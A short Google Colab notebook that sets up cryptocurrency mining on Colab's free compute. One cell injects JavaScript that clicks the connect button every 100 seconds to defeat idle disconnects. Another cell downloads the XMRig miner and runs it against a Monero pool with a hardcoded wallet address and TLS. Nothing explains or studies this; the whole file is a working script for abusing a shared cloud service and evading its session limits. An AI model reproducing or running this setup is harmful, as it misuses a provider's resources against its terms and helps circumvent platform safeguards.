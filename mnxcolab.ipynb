{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled5.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyOQOq7MAcNE94w/WjRgHA8a",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/ulab309/mnx/blob/main/mnxcolab.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "yunhKqyJtvGB"
      },
      "source": [
        "%%javascript\n",
        "function ClickConnect(){\n",
        "    console.log(\"Clicked on connect button\"); \n",
        "    document.querySelector(\"colab-connect-button\").click()\n",
        "}\n",
        "setInterval(ClickConnect,100000)\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "20Z3ytxPt-fA"
      },
      "source": [
        "!wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz\n",
        "!tar xf xmrig-6.10.0-linux-x64.tar.gz\n",
        "!/content/xmrig-6.10.0/xmrig -o us-west.minexmr.com:443 -u 82i1BFYXFPuFoJZfWqyjYnZTz9rbNukKg2UK34kzhhUo8aEwK9cKL2p4TRDqcPeb66D7XTymMQnf86WtcwHFUaNP6wJfiQJ -t 2 -k --tls --randomx-1gb-pages \n"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}